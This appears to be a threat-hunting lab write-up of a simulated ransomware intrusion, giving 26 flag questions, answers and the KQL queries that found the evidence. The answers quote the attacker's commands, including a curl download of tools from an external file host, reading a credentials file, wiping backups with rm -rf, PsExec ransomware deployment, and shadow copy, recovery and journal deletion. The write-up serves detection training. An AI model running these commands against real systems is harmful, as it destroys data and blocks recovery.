
# 🛡️ Threat Hunting & Incident Investigation Report
## Azuki Import/Export – Full Investigation (FLAGS 1–26)

---

This document contains the **complete threat-hunting investigation** for the Azuki ransomware incident.
Each flag includes:
- Full investigation question
- Confirmed answer
- Corresponding KQL used to identify the evidence (unchanged)

---

# 🧩 PHASE 1: LINUX BACKUP SERVER COMPROMISE (FLAGS 1–12)

## 🚩 FLAG 1 – Lateral Movement: Remote Access
**Question:** What remote access command was executed from the compromised workstation to establish access to the Linux backup server?  
**Answer:** `"ssh.exe" backup-admin@10.1.0.189`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where InitiatingProcessAccountName != "system"
| where ProcessCommandLine has_any ("syslog","flow","execve","ssh")
| project TimeGenerated,DeviceName,FileName,ProcessCommandLine,
         InitiatingProcessFileName,InitiatingProcessAccountName,
         InitiatingProcessRemoteSessionIP
| order by TimeGenerated asc
```

---

## 🚩 FLAG 2 – Lateral Movement: Attack Source
**Question:** What IP address initiated the SSH connection to the backup server?  
**Answer:** `10.1.0.108`

```kql
DeviceLogonEvents
| where DeviceName contains "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-30))
| where ActionType == "LogonSuccess"
| where LogonType == "Network"
| project TimeGenerated,DeviceName,RemoteIP,AccountName,LogonType
| order by TimeGenerated asc
```

---

## 🚩 FLAG 3 – Credential Access: Compromised Account
**Question:** What account was used to authenticate to the backup server?  
**Answer:** `backup-admin`

---

## 🚩 FLAG 4 – Discovery: Directory Enumeration
**Question:** What command listed the contents of the backup directory?  
**Answer:** `ls --color=auto -la /backups/`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_any ("backup","ls")
| where FileName contains "ls"
| project TimeGenerated,AccountName,ProcessCommandLine,DeviceName,FolderPath,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 5 – Discovery: File Search
**Question:** What command searched for backup archives?  
**Answer:** `find /backups -name *.tar.gz`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where AccountName contains "backup-admin"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_any ("find",".tar")
| project TimeGenerated,AccountName,ProcessCommandLine,DeviceName,FolderPath,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 6 – Discovery: Account Enumeration
**Question:** What command enumerated local accounts?  
**Answer:** `cat /etc/passwd`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where AccountName != "root"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_all ("cat","passwd","etc")
| project TimeGenerated,AccountName,ProcessCommandLine,DeviceName,FolderPath,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 7 – Discovery: Scheduled Job Reconnaissance
**Question:** What command revealed scheduled jobs on the system?  
**Answer:** `cat /etc/crontab`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where FileName has_any ("cron","")
| where ProcessCommandLine has_any ("crontab")
| project TimeGenerated,AccountName,ProcessCommandLine,DeviceName,FolderPath,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 8 – Command and Control: Tool Transfer
**Question:** What command downloaded external tools?  
**Answer:** `curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_any ("curl","wget","bitsadmin")
| project TimeGenerated,AccountName,ProcessCommandLine,DeviceName,FolderPath,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 9 – Credential Access: Credential Theft
**Question:** What command accessed stored credentials?  
**Answer:** `cat /backups/configs/all-credentials.txt`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_all ("cat","credentials")
| where FileName == "cat"
| project TimeGenerated,AccountName,ProcessCommandLine,DeviceName,FolderPath,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 10 – Impact: Data Destruction
**Question:** What command destroyed backup files?  
**Answer:** `rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_all ("rm","backups")
| project TimeGenerated,AccountName,ProcessCommandLine,DeviceName,FolderPath,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 11 – Impact: Service Stopped
**Question:** What command stopped the backup service?  
**Answer:** `systemctl stop cron`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_all ("systemctl","stop","cron")
| project TimeGenerated,AccountName,ProcessCommandLine,DeviceName,FolderPath,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 12 – Impact: Service Disabled
**Question:** What command permanently disabled the backup service?  
**Answer:** `systemctl disable cron`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_all ("systemctl","disable","cron")
| project TimeGenerated,AccountName,ProcessCommandLine,DeviceName,FolderPath,FileName
| order by TimeGenerated asc
```

---

# 💻 PHASE 2: WINDOWS RANSOMWARE DEPLOYMENT (FLAGS 13–15)

## 🚩 FLAG 13 – Lateral Movement: Remote Execution Tool
**Question:** What remote administration tool executed commands on remote systems?  
**Answer:** `PsExec64.exe`

```kql
DeviceProcessEvents
| where DeviceName contains "adminpc"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where FileName contains "psexec"
| project TimeGenerated,FileName,ProcessCommandLine,DeviceName,FolderPath
| order by TimeGenerated asc
```

---

## 🚩 FLAG 14 – Lateral Movement: Deployment Command
**Question:** What was the full deployment command used to deploy ransomware?  
**Answer:** `"PsExec64.exe" \10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where FileName contains ("psexec")
| where ProcessCommandLine has_all ("*")
| project TimeGenerated,AccountName,ProcessCommandLine,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 15 – Execution: Malicious Payload
**Question:** What payload was deployed?  
**Answer:** `silentlynx.exe`

---

# 🔥 PHASE 3: RECOVERY INHIBITION (FLAGS 16–22)

## 🚩 FLAG 16 – Shadow Copy Service Stopped
**Question:** What command stopped the Volume Shadow Copy Service?  
**Answer:** `"net" stop VSS /y`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_any ("shadows","vss")
| project TimeGenerated,AccountName,ProcessCommandLine,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 17 – Backup Engine Stopped
**Question:** What command stopped the backup engine?  
**Answer:** `"net" stop wbengine /y`

---

## 🚩 FLAG 18 – Defense Evasion: Process Termination
**Question:** What command terminated processes to unlock files?  
**Answer:** `"taskkill" /F /IM sqlservr.exe`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_any ("taskkill")
| project TimeGenerated,AccountName,ProcessCommandLine,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 19 – Recovery Point Deletion
**Question:** What command deleted recovery points?  
**Answer:** `"vssadmin.exe" delete shadows /all /quiet`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_any ("vss","delete")
| project TimeGenerated,AccountName,ProcessCommandLine,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 20 – Storage Limitation
**Question:** What command limited recovery storage?  
**Answer:** `"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_any ("vss","resize")
| project TimeGenerated,AccountName,ProcessCommandLine,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 21 – Recovery Disabled
**Question:** What command disabled system recovery?  
**Answer:** `"bcdedit" /set {default} recoveryenabled No`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_any ("recoveryenabled No","bcdedit")
| project TimeGenerated,AccountName,ProcessCommandLine,FileName
| order by TimeGenerated asc
```

---

## 🚩 FLAG 22 – Backup Catalog Deletion
**Question:** What command deleted the backup catalog?  
**Answer:** `"wbadmin" delete catalog -quiet`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_any ("catalog")
| project TimeGenerated,AccountName,ProcessCommandLine,FileName
| order by TimeGenerated asc
```

---

# 🔒 PHASE 4: PERSISTENCE (FLAGS 23–24)

## 🚩 FLAG 23 – Registry Autorun
**Question:** What registry value established persistence?  
**Answer:** `WindowsSecurityHealth`

---

## 🚩 FLAG 24 – Scheduled Task Persistence
**Question:** What scheduled task was created?  
**Answer:** `Microsoft\Windows\Security\SecurityHealthService`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where AccountName contains "kenji.sato"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine has_any ("schtasks")
| project TimeGenerated,AccountName,ProcessCommandLine,FileName,FolderPath
| order by TimeGenerated asc
```

---

# 🧹 PHASE 5: ANTI-FORENSICS (FLAG 25)

## 🚩 FLAG 25 – Journal Deletion
**Question:** What command deleted forensic evidence?  
**Answer:** `"fsutil.exe" usn deletejournal /D C:`

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where ProcessCommandLine contains "delete"
| project TimeGenerated,AccountName,ProcessCommandLine,FileName,FolderPath
| order by TimeGenerated asc
```

---

# 💀 PHASE 6: RANSOMWARE SUCCESS (FLAG 26)

## 🚩 FLAG 26 – Ransom Note
**Question:** What is the ransom note filename?  
**Answer:** `SILENTLYNX_README.txt`

```kql
DeviceFileEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-12-30))
| where FileName endswith ".txt"
| project TimeGenerated,FileName,FolderPath
| order by TimeGenerated asc
```

---

## ✅ END OF DOCUMENT

